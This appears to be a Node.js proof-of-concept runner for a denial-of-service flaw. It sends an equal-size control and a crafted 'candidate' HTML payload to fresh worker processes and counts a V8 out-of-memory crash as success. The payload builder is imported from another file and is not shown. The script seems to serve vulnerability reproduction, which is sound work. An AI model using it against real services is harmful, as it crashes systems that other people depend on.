import { runProfile } from './e2e-lib.mjs';
import { payloadMeta } from './payload-lib.mjs';

const k = Number(process.env.K ?? 350);
const formattingCount = Number(process.env.A ?? k);
const reconstructionCount = Number(process.env.R ?? k);
const encoding = process.env.ENCODING ?? 'base36';
const transport = process.env.TRANSPORT ?? 'generated';
const heapMb = Number(process.env.HEAP_MB ?? 256);
if (!Number.isInteger(k) || k < 1) throw new Error(`invalid K=${process.env.K}`);

const c = payloadMeta(formattingCount, 'candidate', reconstructionCount, encoding);
console.log(`runtime: node=${process.version} v8=${process.versions.v8}`);
console.log(`profile: heap=${heapMb} MiB a=${formattingCount} r=${reconstructionCount} encoding=${encoding} transport=${transport} attacker_html_bytes=${c.bytes}`);
console.log('NOTE: calibration query is harness-only; the reported attack size is the generated HTML byte length.');

console.log(`\n=== CONTROL: xx=, fresh ${heapMb} MiB worker ===`);
const control = await runProfile({
  profile: 'control',
  formattingCount,
  reconstructionCount,
  encoding,
  transport,
  port: 4101,
  heapMb,
  expect: 'survive',
});
console.log(`CONTROL PASS: HTTP ${control.responseStatus}; health ${control.healthAfter}; worker alive`);

console.log(`\n=== CANDIDATE: id=, fresh ${heapMb} MiB worker ===`);
const candidate = await runProfile({
  profile: 'candidate',
  formattingCount,
  reconstructionCount,
  encoding,
  transport,
  port: 4102,
  heapMb,
  expect: 'observe',
});

if (candidate.oom) {
  console.log(`CANDIDATE PASS: V8 OOM / worker exit at a=${formattingCount}, r=${reconstructionCount}, bytes=${candidate.bytes}`);
  console.log('\nPASS: equal-byte control survives; id candidate terminates a fresh worker.');
  process.exit(0);
}

if (candidate.responseStatus === 200 && candidate.alive) {
  console.error(`\nNOT REPRODUCED at this runtime/threshold: candidate returned HTTP 200 and remained healthy.`);
  console.error(`node=${process.version} v8=${process.versions.v8} heap=${heapMb} a=${formattingCount} r=${reconstructionCount} encoding=${encoding} bytes=${candidate.bytes}`);
  console.error('Run: npm run poc:calibrate:256');
  process.exit(2);
}

console.error('\nINCONCLUSIVE candidate result:');
console.error(JSON.stringify({
  responseStatus: candidate.responseStatus,
  requestError: candidate.requestError,
  healthAfter: candidate.healthAfter,
  exited: candidate.exited,
  fatal: candidate.fatal,
}, null, 2));
process.exit(3);
